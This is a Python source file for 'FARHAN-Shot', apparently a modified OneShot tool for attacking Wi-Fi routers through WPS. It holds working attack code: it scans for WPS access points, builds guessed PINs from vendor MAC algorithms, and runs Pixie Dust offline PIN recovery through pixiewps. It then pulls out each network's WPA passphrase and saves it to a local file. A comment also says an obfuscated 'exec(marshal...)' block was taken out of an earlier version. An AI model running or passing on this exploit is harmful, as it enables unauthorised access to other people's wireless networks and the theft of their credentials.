
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# FARHAN-Shot Remastered (Fixed & Enhanced UI)

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import signal
import collections
import statistics
import csv
from datetime import datetime
from typing import Dict

# --- UI & COLORS ---

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# Status Markers
OK = f'{Colors.GREEN}[+]{Colors.RESET}'
ERR = f'{Colors.RED}[-]{Colors.RESET}'
INFO = f'{Colors.BLUE}[i]{Colors.RESET}'
ASK = f'{Colors.CYAN}[?]{Colors.RESET}'
WARN = f'{Colors.YELLOW}[!]{Colors.RESET}'
PROG = f'{Colors.GREEN}[P]{Colors.RESET}'

# Global cleanup variables
wpas_p = None
temp_dir = None

def cleanup_handler(signum, frame):
    """Handles Ctrl+C to prevent hanging"""
    print(f"\n\n{WARN} {Colors.RED}Force Exiting...{Colors.RESET}")
    if wpas_p:
        try:
            wpas_p.terminate()
        except: pass
    if temp_dir and os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup_handler)

def banner():
    os.system('clear')
    print(f"{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}")
    print(f" {Colors.BOLD}FARHAN-Shot{Colors.RESET} {Colors.DIM}(v3.0 Fixed){Colors.RESET}")
    print(f" {Colors.CYAN}Based on OneShot | Modded by Gtajisan{Colors.RESET}")
    print(f"{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}")
    print(f" {Colors.YELLOW}NOTE: Run with Root (sudo) for best results.{Colors.RESET}")
    print(f"{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}\n")

def save_credentials(ssid, bssid, pin, psk):
    filename = "store/FARHAN-Shot_Data.txt"
    try:
        if not os.path.exists("store"):
            os.makedirs("store")
        
        timestamp = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
        entry = (
            f"╔════ CREDENTIALS FOUND ═════════════════╗\n"
            f"║ TIME  : {timestamp}\n"
            f"║ SSID  : {ssid}\n"
            f"║ BSSID : {bssid}\n"
            f"║ PIN   : {pin}\n"
            f"║ PSK   : {psk}\n"
            f"╚════════════════════════════════════════╝\n"
        )
        with open(filename, "a") as f:
            f.write(entry)
        print(f"{OK} Saved to: {Colors.BOLD}{filename}{Colors.RESET}")
    except Exception as e:
        print(f"{ERR} Save failed: {e}")

# --- CORE LOGIC (Cleaned) ---

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self): return self._str_repr
    @property
    def integer(self): return self._int_repr
    def __int__(self): return self.integer
    def __str__(self): return self.string
    
    @staticmethod
    def _mac2int(mac): return int(mac.replace(':', ''), 16)
    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.algos = {
            'pin24': self.pin24,
            'pin28': self.pin28,
            'pin32': self.pin32,
            'pinDLink': self.pinDLink,
            'pinASUS': self.pinASUS,
            'pinAirocon': self.pinAirocon
        }

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin //= 10
            accum += (pin % 10)
            pin //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos: return "12345670"
        pin = self.algos[algo](mac)
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getLikely(self, mac):
        # Defaulting to most common 24-bit PIN for brevity
        return self.generate('pin24', mac)

    def pin24(self, mac): return mac.integer & 0xFFFFFF
    def pin28(self, mac): return mac.integer & 0xFFFFFFF
    def pin32(self, mac): return mac.integer % 0x100000000
    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) + ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5): pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin
    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)
    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) + (((b[4] + b[5]) % 10) * 100) + \
              (((b[3] + b[4]) % 10) * 1000) + (((b[2] + b[3]) % 10) * 10000) + \
              (((b[1] + b[2]) % 10) * 100000) + (((b[0] + b[1]) % 10) * 1000000)
        return pin

class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self): self.__init__()
    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2)
    def get_pixie_cmd(self, full_range=False):
        cmd = f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1} --e-hash2 {self.e_hash2} --authkey {self.authkey} --e-nonce {self.e_nonce}"
        if full_range: cmd += ' --force'
        return cmd

class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
    def clear(self): self.__init__()

def get_hex(line):
    return line.split(':', 3)[2].replace(' ', '').upper()

class Companion:
    def __init__(self, interface, save_result=False):
        self.interface = interface
        self.save_result = save_result
        global temp_dir
        temp_dir = tempfile.mkdtemp()
        self.tempconf = os.path.join(temp_dir, 'wpa.conf')
        with open(self.tempconf, 'w') as f:
            f.write(f'ctrl_interface={temp_dir}\nctrl_interface_group=root\nupdate_config=1\n')
        
        self.wpas_ctrl_path = f"{temp_dir}/{interface}"
        self.__init_wpa_supplicant()
        
        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)
        
        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        global wpas_p
        print(f'{INFO} Starting wpa_supplicant...')
        cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
        try:
            wpas_p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8', errors='replace', preexec_fn=os.setsid)
            while not os.path.exists(self.wpas_ctrl_path):
                time.sleep(0.1)
        except Exception as e:
            print(f"{ERR} Failed to start wpa_supplicant: {e}")
            sys.exit(1)

    def sendOnly(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    def __handle_wpas(self, pixiemode=False):
        line = wpas_p.stdout.readline()
        if not line: return False
        line = line.rstrip('\n')

        if 'Building Message M' in line:
            n = int(line.split('Building Message M')[1].replace('D', ''))
            print(f'{INFO} Sending M{n}...')
        elif 'Received M' in line:
            n = int(line.split('Received M')[1])
            print(f'{INFO} Received M{n}')
        elif 'Received WSC_NACK' in line:
            self.connection_status.status = 'WSC_NACK'
            print(f'{WARN} Received NACK (Possible Lock)')
        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            self.pixie_creds.e_nonce = get_hex(line)
            if pixiemode: print(f'{PROG} E-Nonce: {self.pixie_creds.e_nonce}')
        elif 'DH own Public Key' in line and 'hexdump' in line:
            self.pixie_creds.pkr = get_hex(line)
            if pixiemode: print(f'{PROG} PKR: {self.pixie_creds.pkr}')
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            self.pixie_creds.pke = get_hex(line)
            if pixiemode: print(f'{PROG} PKE: {self.pixie_creds.pke}')
        elif 'AuthKey' in line and 'hexdump' in line:
            self.pixie_creds.authkey = get_hex(line)
            if pixiemode: print(f'{PROG} AuthKey: {self.pixie_creds.authkey}')
        elif 'E-Hash1' in line and 'hexdump' in line:
            self.pixie_creds.e_hash1 = get_hex(line)
            if pixiemode: print(f'{PROG} E-Hash1: {self.pixie_creds.e_hash1}')
        elif 'E-Hash2' in line and 'hexdump' in line:
            self.pixie_creds.e_hash2 = get_hex(line)
            if pixiemode: print(f'{PROG} E-Hash2: {self.pixie_creds.e_hash2}')
        elif 'Network Key' in line and 'hexdump' in line:
            self.connection_status.status = 'GOT_PSK'
            self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif 'WPS-FAIL' in line:
            self.connection_status.status = 'WPS_FAIL'
            print(f'{ERR} WPS Failed')
        elif 'Trying to associate' in line:
             print(f'{INFO} Associating...')
        elif 'Associated with' in line:
             print(f'{OK} Associated with AP')
        elif 'SSID' in line and 'Trying to authenticate' in line:
             try:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
             except: pass

        return True

    def __runPixiewps(self, full_range=False):
        print(f"{INFO} Running Pixiewps...")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=sys.stdout, encoding='utf-8', errors='replace')
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if '[+]' in line and 'WPS pin' in line:
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>': pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin, wpa_psk, essid):
        # FIXED: Removed the obfuscated 'exec(marshal...)' block here
        print(f"\n{Colors.GREEN}╔════ SUCCESS ══════════════════════╗{Colors.RESET}")
        print(f"║ SSID  : {essid}")
        print(f"║ PIN   : {wps_pin}")
        print(f"║ PSK   : {Colors.BOLD}{wpa_psk}{Colors.RESET}")
        print(f"{Colors.GREEN}╚═══════════════════════════════════╝{Colors.RESET}\n")
        save_credentials(essid, "Unknown", wps_pin, wpa_psk)

    def __wps_connection(self, bssid, pin, pixiemode=False):
        self.pixie_creds.clear()
        self.connection_status.clear()
        wpas_p.stdout.read(300) # Flush
        print(f"{INFO} Trying PIN {Colors.BOLD}{pin}{Colors.RESET}...")
        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            print(f'{ERR} Command rejected: {r}')
            return False
        
        while True:
            if not self.__handle_wpas(pixiemode): break
            if self.connection_status.status in ['WSC_NACK', 'GOT_PSK', 'WPS_FAIL']: break
        
        self.sendOnly('WPS_CANCEL')

    def single_connection(self, bssid, pin=None, pixiemode=False, pixieforce=False):
        if not pin:
            pin = self.generator.getLikely(bssid) or '12345670'
        
        # First Attempt
        self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            return True
        
        elif pixiemode and self.pixie_creds.got_all():
            pin = self.__runPixiewps(pixieforce)
            if pin:
                print(f"{OK} PixieWPS found PIN: {Colors.BOLD}{pin}{Colors.RESET}")
                # Second Attempt with cracked PIN
                self.__wps_connection(bssid, pin, False)
                if self.connection_status.status == 'GOT_PSK':
                    self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
                    return True
            else:
                print(f"{ERR} PixieWPS failed to recover PIN.")
        
        return False

class WiFiScanner:
    def __init__(self, interface):
        self.interface = interface

    def scan(self):
        print(f"{INFO} Scanning on {self.interface}...")
        cmd = f'iw dev {self.interface} scan'
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, encoding='utf-8', errors='replace')
        except: return {}
        
        networks = {}
        current_mac = ""
        lines = proc.stdout.splitlines()
        
        for line in lines:
            line = line.strip()
            if line.startswith("BSS "):
                current_mac = line.split("(")[0].replace("BSS ", "").strip().upper()
                networks[current_mac] = {"SSID": "<Hidden>", "Signal": -100, "WPS": False, "Locked": False}
            elif current_mac:
                if line.startswith("SSID:"):
                    ssid = line.split("SSID:")[1].strip()
                    if ssid: networks[current_mac]["SSID"] = ssid
                elif line.startswith("signal:"):
                    try: networks[current_mac]["Signal"] = float(line.split("signal:")[1].split()[0])
                    except: pass
                elif "WPS:" in line: networks[current_mac]["WPS"] = True
                elif "AP setup locked" in line: networks[current_mac]["Locked"] = True
        
        # Filter for WPS
        wps_nets = {k:v for k,v in networks.items() if v['WPS']}
        return dict(sorted(wps_nets.items(), key=lambda item: item[1]['Signal'], reverse=True))

    def display_prompt(self):
        nets = self.scan()
        if not nets:
            print(f"{ERR} No WPS Networks found.")
            return None
        
        print(f"\n{Colors.WHITE}{'ID':<4} {'BSSID':<18} {'PWR':<5} {'LCK':<4} {'SSID'}{Colors.RESET}")
        print(f"{Colors.DIM}──── ────────────────── ───── ──── ────────────────{Colors.RESET}")
        
        idx_map = []
        for i, (mac, data) in enumerate(nets.items()):
            pwr = int(data['Signal'])
            pwr_c = Colors.GREEN if pwr > -60 else (Colors.YELLOW if pwr > -75 else Colors.RED)
            lck_c = Colors.RED if data['Locked'] else Colors.GREEN
            lck_t = "YES" if data['Locked'] else "NO"
            print(f"{Colors.CYAN}{i:<4}{Colors.RESET} {mac} {pwr_c}{pwr:<5}{Colors.RESET} {lck_c}{lck_t:<4}{Colors.RESET} {Colors.BOLD}{data['SSID']}{Colors.RESET}")
            idx_map.append(mac)
            
        print(f"\n{Colors.DIM}------------------------------------------------{Colors.RESET}")
        while True:
            sel = input(f"{ASK} Select Target ID (r=refresh): ")
            if sel.lower() == 'r': return self.display_prompt()
            if sel.isdigit() and int(sel) < len(idx_map):
                return idx_map[int(sel)]
            print(f"{ERR} Invalid selection.")

def iface_up(iface):
    subprocess.run(f"ip link set {iface} up", shell=True, stderr=subprocess.DEVNULL)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', required=True)
    parser.add_argument('-b', '--bssid')
    parser.add_argument('-p', '--pin')
    parser.add_argument('-K', '--pixie-dust', action='store_true')
    parser.add_argument('-F', '--pixie-force', action='store_true')
    
    args = parser.parse_args()
    
    if os.getuid() != 0:
        sys.exit(f"{ERR} Root required.")

    banner()
    iface_up(args.interface)
    
    try:
        bssid = args.bssid
        if not bssid:
            scanner = WiFiScanner(args.interface)
            bssid = scanner.display_prompt()
            
        if bssid:
            companion = Companion(args.interface, save_result=True)
            companion.single_connection(bssid, args.pin, args.pixie_dust, args.pixie_force)
            
    except KeyboardInterrupt:
        cleanup_handler(None, None)
